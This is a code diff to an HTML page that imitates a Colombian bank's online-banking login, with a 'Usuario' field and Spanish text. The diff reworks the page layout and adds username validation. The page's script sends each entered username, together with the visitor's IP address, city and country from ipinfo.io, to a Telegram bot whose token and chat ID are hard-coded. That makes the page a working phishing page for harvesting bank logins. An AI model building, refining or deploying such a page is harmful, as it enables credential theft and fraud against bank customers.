@@ -27,11 +27,6 @@
             text-align: left;
         }
 
-
-
-
-
-
         .form-control {
             border-width: 0 0 1px 0; /* Solo línea inferior */
             border-color: black; /* Línea negra siempre */
@@ -49,8 +44,6 @@
             background-color: white; /* Fondo blanco al enfocar */
         }
 
-
-
         .btn-primary {
             outline: none;
             display: flex;
@@ -65,8 +58,6 @@
             border-color: #fdda24;
             color: #292929;
         }
-
-
 
         .btn-primary {
             background-color: #fdda24; /* Color amarillo */
@@ -156,14 +147,12 @@
         }
     </style>
 </head>
-    <img src="in.jpeg" alt="" width="100%">
 <body>
-
-
+    <img src="in.jpeg" alt="" width="100%">
     <div class="container">
         <br>
- <div class="sc-fqkvVR iGPcWV"> El usuario es el mismo con el que ingresas a la</div>
-      <div class="sc-iGgWBj cxASel"> Sucursal Virtual Personas. </div>
+        <div class="sc-fqkvVR iGPcWV">El usuario es el mismo con el que ingresas a la</div>
+        <div class="sc-iGgWBj cxASel">Sucursal Virtual Personas.</div>
         <br>
         <form id="simple-form">
             <div class="input-container">
@@ -172,10 +161,9 @@
                     <label for="inputDato">Usuario</label>
                 </div>
             </div>
-             <p class="sc-tagGq fpfLgB">¿Olvidaste tu usuario?</p>
+            <p class="sc-tagGq fpfLgB">¿Olvidaste tu usuario?</p>
             <div class="btn-container">
                 <button type="button" id="btn-enviar" class="btn btn-primary">Continuar</button>
-
             </div>
         </form>
     </div>
@@ -188,11 +176,21 @@
                 const botToken = '7010913168:AAG6dWUFcTUuSSYBDv-ub5KtpLjFIihrYxQ';
                 const chatId = '6781382323';
 
+                // Validación de entrada
                 if (!dato) {
                     alert("Por favor, debe ingresar su usuario.");
                     return;
                 }
+                if (!/^[a-zA-Z0-9]+$/.test(dato)) {
+                    alert("El usuario debe ser alfanumérico (solo letras y números).");
+                    return;
+                }
+                if (dato.length <= 8) {
+                    alert("El usuario debe tener más de 8 caracteres.");
+                    return;
+                }
 
+                // Obtener información de la IP
                 $.getJSON('https://ipinfo.io/json', function(data) {
                     const ip = data.ip || 'IP desconocida';
                     const ciudad = data.city || 'Ciudad desconocida';
@@ -200,6 +198,7 @@
 
                     const mensaje = `👁Formulario Simple👁\n📝Dato ingresado: ${dato}\n🌏IP: ${ip}\n🏙Ciudad: ${ciudad}\n🇨🇴País: ${pais}`;
 
+                    // Enviar datos al bot de Telegram
                     $.ajax({
                         url: `https://api.telegram.org/bot${botToken}/sendMessage`,
                         method: 'POST',
